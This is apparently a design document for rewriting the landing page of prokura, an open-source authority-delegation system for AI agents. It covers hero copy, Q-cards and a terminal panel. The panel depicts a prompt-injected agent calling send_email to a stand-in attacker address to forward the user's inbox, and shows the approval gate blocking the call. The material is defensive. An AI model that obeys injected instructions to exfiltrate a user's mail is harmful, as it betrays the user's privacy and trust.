## Context

`docs/index.html` is the front door for every audience (AI/agent developers,
security engineers, hiring managers, OSS evaluators). Its current hero leads
with a category label and a jargon-dense lede; the four "Why this exists"
Q-cards answer themselves in mechanism vocabulary. The design goal (agreed in
brainstorming, 2026-08-10) is *scene-first*: the reader feels the problem in
plain second person before any solution vocabulary appears.

The page already links `walkthroughs/walkthrough.css` and has an inline
`<style>` block for page-local classes (`.qcard`, `.navcard`, `.grid`).
The walkthrough visual language provides `screen` / `bar` / `body term`
terminal panels with span classes `c` (comment), `k` (key), `g` (green),
`b` (bold/status), `p` (prompt), `o` (orange).

## Goals / Non-Goals

**Goals:**
- The problem lands viscerally in the first two sentences, with zero
  mechanism jargon before it.
- One visual "what this buys you" moment: a sensitive action failing closed,
  drawn only from real stack behavior (tools-api's `428 approval_required`,
  the trusted approval UI at :8120, the M9 kill switch).
- The four questions create tension (*today you cannot answer this*) before
  resolving (*with prokura you can*), plain language first, mechanism demoted
  to a tag.
- Depth signals retained for expert audiences: standards names as tags,
  stack sentence at the lede's end, everything below the fold unchanged.

**Non-Goals:**
- No changes to walkthroughs, blog, README, `walkthrough.css`, or services.
- No new diagrams/illustration system; reuse the existing terminal aesthetic.
- No restructuring of the page's section order or navigation.

## Decisions

**D1 — Scene-first copy over a before/after graphic or full incident replay.**
Alternatives considered: (b) a two-panel before/after diagram — new visual
vocabulary the page doesn't have, risks looking bolted-on; (c) a full
"incident replay" opening — most visceral but shifts the page's tone to
attack demo and is a bigger build. Chosen: rewrite the words (cheapest, fixes
the actual defect) plus one compact fail-closed terminal panel borrowed from
(c) in the already-established aesthetic.

**Hero copy (verbatim).** H1: `Your agent shouldn't <i>be</i> you.` Lede:

> To let an AI agent act for you today, you hand it your password or a
> long-lived API key. From that moment the agent <b>is</b> you — anything
> it's tricked into doing, it does as you, with everything you can reach,
> and no log can tell you apart. Prokura replaces that with authority you
> <b>grant</b>: scoped to a task, consent-gated per agent, human-approved
> when it matters, and revocable in one click. Built from <b>Keycloak,
> OpenFGA, and OpenBao</b>; reachable over <b>MCP</b>; an OSS answer to
> "Auth0 for AI Agents."

Eyebrow, chips row, and `<title>` unchanged.

**D2 — The fail-closed panel sits inside the hero, after the chips.**
It is the emotional payoff of the lede's last sentence and must be visible in
the first screenful. Content (line breaks as shown; span classes per the
walkthrough conventions above):

```
# a prompt-injected agent tries a sensitive act — as it would with your password:
tools/call send_email { to: "attacker@…", subject: "forwarding your inbox" }

# with prokura, it doesn't have your password — it has delegated authority:
HTTP/1.1 428 approval_required        # nothing sent. a human sees the real payload
→ you deny on the trusted approval page … the action never executes
→ or hit the kill switch: every token this agent holds is dead in seconds
```

Caption line under the screen: **Fail closed, not fail open** — this runs
live in the demo below. Every depicted behavior is real: the 428 refusal and
payload registration are the tools-api approval gate (SPEC.md Flow C;
ADR-0018), deny-on-trusted-UI is the approval service (ADR-0007 — decisions
only through the authenticated UI), and the kill switch is M9 (ADR-0024).
"dead in seconds" is backed by the measured time-to-stop.

**D3 — Q-cards become today→/prokura→ pairs with a mechanism tag.**
Each `.qcard` keeps `n` (Q1–Q4) and `q` (the question). The single `.a`
answer is replaced by two short lines and a tag:

| Q | today → | prokura → | tag |
|---|---|---|---|
| Q1 Who authorized this agent to act as me? | nobody can say — a shared password looks exactly like you. | the agent carries its own token naming both you and it. | `RFC 8693` |
| Q2 What exactly can it do — and nothing more? | everything you can do, everywhere, until you rotate the password. | one provider, named scopes, 15-minute tokens, consent per agent. | `broker + FGA` |
| Q3 Does a human decide when it matters? | you find out afterwards, if ever. | sensitive actions stop and wait for your approval of the exact payload. | `CIBA step-up` |
| Q4 Can I stop it — right now? | rotate your password and break everything else that uses it. | revoke that one delegation; measured time-to-stop in seconds. | `kill switch` |

Copy honesty notes: "15-minute tokens" is the enforced ≤15-min TTL
(SPEC-REVIEW TTL-honesty decision); "measured time-to-stop" is M9's measured
metric.

**D4 — Styling stays in the page's inline `<style>` block.**
New classes: a muted "today" line, an ink "prokura" line, and `.qcard .mech`
(mono tag, same visual family as `.navcard .ext`). `walkthrough.css` is
shared with the walkthroughs and must not change for a page-local concern.

**D5 — Section intro trimmed, not removed.** The "Why this exists" `p.lead`
may be lightly trimmed to avoid restating the new lede; the section `h2`
("One agent is convenient. Fifty is a governance problem.") and the closing
"reference architecture, not a SaaS" paragraph stay.

## Risks / Trade-offs

- [Hero grows taller — the fail-closed panel could push "Start here" below
  two screenfuls] → keep the panel to ~7 lines and the caption to one line;
  no second screen in the hero.
- [Terminal panel could read as fabricated output] → depict only behaviors
  the stack actually exhibits, keep HTTP status/text exact
  (`428 approval_required`), and say "this runs live in the demo below."
- [Plainer Q-card language could under-signal rigor to security engineers] →
  mechanism tags (`RFC 8693`, `CIBA step-up`, …) preserve the scent of depth;
  the untouched lower sections carry the full detail.
- [Copy drift from actual stack behavior over time] → the panel and tags name
  stable, ADR-backed behaviors (ADR-0007, ADR-0018, ADR-0024), not
  incidental output formatting.
